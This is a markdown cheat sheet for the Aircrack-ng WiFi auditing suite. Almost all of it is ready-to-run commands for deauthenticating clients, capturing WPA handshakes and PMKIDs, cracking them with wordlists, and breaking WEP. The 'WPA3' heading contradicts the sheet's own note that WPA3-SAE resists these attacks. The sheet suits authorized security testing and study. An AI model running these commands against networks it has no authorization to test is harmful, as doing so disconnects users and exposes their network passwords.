# Aircrack-ng Suite Cheat Sheet
> WiFi security auditing (WEP/WPA/WPA2) · Wireless · `apt install aircrack-ng`

---

## Quick start
```bash
sudo airmon-ng start wlan0                # enable monitor mode -> wlan0mon
sudo airodump-ng wlan0mon                 # see nearby APs/clients
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon    # deauth to force a handshake
aircrack-ng -w rockyou.txt capture-01.cap
```

## Core tools
| Tool | Purpose |
|---|---|
| `airmon-ng` | enable/disable monitor mode, kill interfering processes |
| `airodump-ng` | capture 802.11 frames, discover APs/clients, save handshakes |
| `aireplay-ng` | inject frames — deauth, fake auth, ARP replay |
| `aircrack-ng` | crack WEP/WPA-PSK from a capture file |
| `airdecap-ng` | decrypt a capture given the key |
| `wifite` | automated wrapper over the whole workflow |

## WPA/WPA2 handshake capture + crack
```bash
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon                                    # find target channel/BSSID
sudo airodump-ng -c <ch> --bssid <BSSID> -w cap wlan0mon      # start focused capture
sudo aireplay-ng -0 5 -a <BSSID> wlan0mon                     # deauth a client to grab handshake
aircrack-ng -w rockyou.txt -b <BSSID> cap-01.cap
```

## WPA3 / PMKID attack (no client needed)
```bash
sudo hcxdumptool -i wlan0mon -o dump.pcapng --enable_status=1
hcxpcapngtool -o hash.hc22000 dump.pcapng
hashcat -m 22000 hash.hc22000 rockyou.txt
```

## WEP cracking (legacy)
```bash
sudo airodump-ng -c <ch> --bssid <BSSID> -w wep wlan0mon
sudo aireplay-ng -1 0 -a <BSSID> wlan0mon        # fake auth
sudo aireplay-ng -3 -b <BSSID> wlan0mon          # ARP replay to generate traffic
aircrack-ng wep-01.cap
```

## Automated (wifite)
```bash
sudo wifite --kill                         # kill interfering processes first
sudo wifite -i wlan0mon
```

## Gotchas / OPSEC
- Authorized networks only — deauth attacks disrupt real client connectivity.
- Monitor mode support varies by chipset/driver; check `airmon-ng` output for injection compatibility issues.
- WPA3-SAE (not just PMKID-vulnerable transition mode) resists offline dictionary attacks — PMKID capture only works against networks that support the older roaming feature.

## See also
- https://www.aircrack-ng.org/
- `qyvora/mansa.md`, `passwords/hashcat.md`
